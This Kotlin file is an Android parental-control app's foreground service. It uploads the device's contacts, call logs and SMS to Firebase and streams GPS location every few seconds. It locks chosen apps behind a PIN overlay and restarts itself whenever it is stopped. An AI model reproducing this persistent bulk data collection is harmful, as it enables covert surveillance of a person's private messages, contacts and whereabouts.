package com.example.parentalcontrol.service

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.graphics.PixelFormat
import android.location.Location
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.util.Log
import android.view.WindowManager
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.example.parentalcontrol.MainActivity
import com.example.parentalcontrol.R
import com.example.parentalcontrol.model.ContactModel
import com.example.parentalcontrol.utils.*
import com.google.android.gms.location.*
import com.google.android.gms.tasks.OnFailureListener
import com.google.android.gms.tasks.OnSuccessListener
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.flow.distinctUntilChanged
import kotlinx.coroutines.launch
import java.util.concurrent.Executors

public class ForegroundServiceWithNotification : Service() {

    private val PREF_FILE_NAME = "AppLockerPrefs"
    private val LOCKED_APPS_PREF_KEY = "LockedApps"
    private lateinit var pinOverlayView: PinOverlayView

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationReference: DatabaseReference
    private val handler = Handler()
    private val delayMillis = 5000L // 5 seconds
    private val executorService = Executors.newSingleThreadExecutor()
    private lateinit var job: Job
    private lateinit var prefs: SharedPreferences

    @SuppressLint("NewApi")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val input = intent?.getStringExtra("inputExtra")
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            0
        )
        val notification: Notification = NotificationCompat.Builder(this, MyApp.CHANNEL_ID)
            .setContentTitle("Notification Service")
            .setContentText(input)
            .setSmallIcon(R.drawable.ic_logo)
            .setContentIntent(pendingIntent)
            .build()
        val mNotificationManager =
            getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                MyApp.CHANNEL_ID,
                MyApp.CHANNEL_NAME,
                NotificationManager.IMPORTANCE_DEFAULT
            )
            mNotificationManager.createNotificationChannel(channel)
            NotificationCompat.Builder(this, MyApp.CHANNEL_ID)
        }
        startForeground(1, notification)
        Toast.makeText(this, "Work", Toast.LENGTH_SHORT).show()

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        locationReference = FirebaseDatabase.getInstance().getReference("UserId")

        startContactsFetching()
        startAppLocking()
        startRepeatingTask()
        startLocationUpdates()
        startCallLogsFetching()
        startSmsFetching()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        stopLocationUpdates()
        job.cancel()
        stopRepeatingTask()
        Toast.makeText(this, "Stop", Toast.LENGTH_SHORT).show()
        scheduleServiceRestart()
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    private fun startAppLocking() {
        job = CoroutineScope(Dispatchers.Main).launch {
            observeForegroundApps().distinctUntilChanged().collect { packageName ->
                if (isAppLocked(packageName)) {
                    // Implement overlay logic here
                    showPinOverlay()
                }
            }
        }
    }

    private fun isAppLocked(packageName: String?): Boolean {
        prefs = getSharedPreferences(PREF_FILE_NAME, Context.MODE_PRIVATE)
        val lockedApps = prefs.getString(LOCKED_APPS_PREF_KEY, "")
        return packageName != null && lockedApps?.contains(packageName) ?: false
    }

    private fun showPinOverlay() {
        pinOverlayView = PinOverlayView(this, null)
        val layoutFlag: Int = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            WindowManager.LayoutParams.TYPE_PHONE
        }
        val params = WindowManager.LayoutParams(

            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            layoutFlag,
            WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT

            /*WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            layoutFlag,
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT*/
        )
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        windowManager.addView(pinOverlayView, params)
    }



    private fun scheduleServiceRestart() {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, RestartServiceReceiver::class.java)
        val pendingIntent =
            PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT)
        val triggerAtMillis = System.currentTimeMillis() + delayMillis
        val repeatIntervalMillis = 60 * 1000L
        if (alarmManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setAndAllowWhileIdle(
                    AlarmManager.RTC_WAKEUP,
                    triggerAtMillis,
                    pendingIntent
                )
            } else {
                alarmManager.set(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent)
            }
            alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                triggerAtMillis,
                repeatIntervalMillis,
                pendingIntent
            )
        }
    }

    private fun runInBackground(task: Runnable) {
        Thread(task).start()
    }

    private fun sendImagesToDatabase() {
        FirebaseHelper.uploadImagesToFirebase(MediaStoreHelper.getAllImages(this))
    }

    private fun sendVideosToDatabase() {
        FirebaseHelper.uploadVideosToFirebase(MediaStoreHelper.getAllVideos(this))
    }

    private fun sendDocumentsToFirebase() {
        FirebaseHelper.uploadDocumentsToFirebase(MediaStoreHelper.getAllDocuments(this))
    }

    private fun startCallLogsFetching() {
        FirebaseHelper.uploadCallLogToFirebase(CallLogUtils.getAllCallLogs(this))
    }

    private fun startSmsFetching() {
        FirebaseHelper.uploadSmsToFirebase(SmsUtils.getAllSms(this))
    }

    private fun startContactsFetching() {
        ContactUtils.getAllContactsListAsync(this
        ) { contactsList -> FirebaseHelper.uploadContactsToFirebase(contactsList) }
    }

    private fun startRepeatingTask() {
        Thread {
            while (true) {
                Log.e("Service", "Service is running...")
                try {
                    Thread.sleep(2000)
                } catch (e: InterruptedException) {
                    e.printStackTrace()
                }
            }
        }.start()
    }

    private fun stopRepeatingTask() {
        handler.removeCallbacksAndMessages(null)
    }

    private fun startLocationUpdates() {
        val locationRequest = LocationRequest()
        locationRequest.interval = 5000
        locationRequest.fastestInterval = 3000
        locationRequest.priority = LocationRequest.PRIORITY_HIGH_ACCURACY
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, null)
        }
    }

    private fun stopLocationUpdates() {
        fusedLocationClient.removeLocationUpdates(locationCallback)
    }

    private val locationCallback = object : LocationCallback() {
        override fun onLocationResult(locationResult: LocationResult) {
            if (locationResult != null) {
                val location: Location? = locationResult.lastLocation
                if (location != null) {
                    updateLocationInFirebase(location.latitude, location.longitude)
                }
            }
        }
    }

    private fun updateLocationInFirebase(latitude: Double, longitude: Double) {
        locationReference.child("locationData").child("latitude").setValue(latitude)
            .addOnSuccessListener {
                Log.d("locationSaveInDb", "onSuccess: ")
            }
            .addOnFailureListener { e ->
                Log.d("locationSaveInDb", "onFailure: ${e.message}")
            }
        locationReference.child("locationData").child("longitude").setValue(longitude)
    }
}
